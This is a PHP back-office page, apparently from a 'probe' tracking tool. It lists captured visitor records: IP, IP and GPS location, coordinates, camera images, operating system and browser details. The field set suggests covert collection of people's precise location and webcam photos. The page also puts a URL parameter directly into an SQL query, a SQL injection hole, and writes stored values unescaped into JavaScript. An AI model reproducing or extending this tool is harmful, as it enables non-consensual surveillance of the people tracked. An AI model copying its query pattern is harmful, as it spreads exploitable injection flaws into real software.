<?php include_once("../include/backstage/header.php"); ?>
<?php
if($admin_login!="true"){
include_once("../include/backstage/footer.php");
exit('<script>
		layui.use("layer", function(){
			var layer = layui.layer;
			
		layer.open({
			title: "提示"
			,content:"您还未登录"
			
				,yes: function(index, layero){
				window.location.href="/admin/login_admin.php";
					layer.close(index);
					}
				
				,cancel: function(index, layero){ 
				window.location.href="/admin/login_admin.php";
					layer.close(index);
				}  
			
		});     
		
		}); 						
		</script>');
}
?>
<fieldset class="layui-elem-field">
  <legend>探针详情</legend>
	<div class="layui-field-box">
<?php
$key=$_GET['key'];
$row=$DB->query("select*from list_ip where key_ip='{$key}'");
while($rows = $DB->fetch($row))
	 {
	$data_list_details_probe= '
	 {
	 				"id":"'.$rows['id'].'"'.
	 				',"key":"'. $rows['key_ip'].'"'.
					',"page":"'. $rows['page'].'"'.
					',"ip":"'. $rows['ip'].'"'.
					',"ip_location":"'. $rows['ip_location'].'"'.
					',"ip_lonlat":"'. $rows['ip_lonlat'].'"'.
					',"gps_location":"'. $rows['gps_location'].'"'.
					',"gps_lonlat":"'. $rows['gps_lonlat'].'"'.
				',"camera_img":"'. $rows['camera_img'].'"'.
			',"system":"'. $rows['system'].'"'.
	',"browser":"'. $rows['browser'].'"'.
	',"browser_ua":"'. $rows['browser_ua'].'"'.
	',"browser_language":"'. $rows['browser_language'].'"'.
	 			'},'.$data_list_details_probe;
}
$data_list_details_probe = substr($data_list_details_probe,0,strlen($data_list_details_probe)-1); 
echo'
<table class="layui-hide" id="list_details_probe" lay-filter="list_details_probe"></table>
<script>
layui.use("table", function(){
  var table = layui.table;
  
  //展示已知数据
  table.render({
    elem: "#list_details_probe"
    ,cols: [[ //标题栏
      {field: "id", title: "ID", width: 70, sort: true}
      ,{field: "key", title: "密钥", width: 120}
      ,{field: "ip", title: "IP", width: 100}
      ,{field: "ip_location", title: "IP位置", width: 105}
      ,{field: "ip_lonlat", title: "IP经纬度", width: 105}
      ,{field: "gps_location", title: "GPS位置", width: 105}
      ,{field: "gps_lonlat", title: "GPS经纬度", width: 105}
	  ,{field: "camera_img", title: "摄像头图片", width: 105}
      ,{field: "system", title: "操作系统", width: 105}
      ,{field: "browser", title: "浏览器", width: 105}
	 ,{field: "browser_ua", title: "浏览器UA", width: 105}
	 ,{field: "browser_language", title: "浏览器语言", width: 105}
    ]]
    ,data: ['.$data_list_details_probe
.']
    //,skin: "line" //表格风格
    ,even: true
    ,page: true //是否显示分页
    //,limits: [5, 7, 10]
    ,limit: 10 //每页默认显示的数量
  });
	
});
</script>';
?>
 </div>
</fieldset>
<?php include_once("../include/backstage/footer.php"); ?>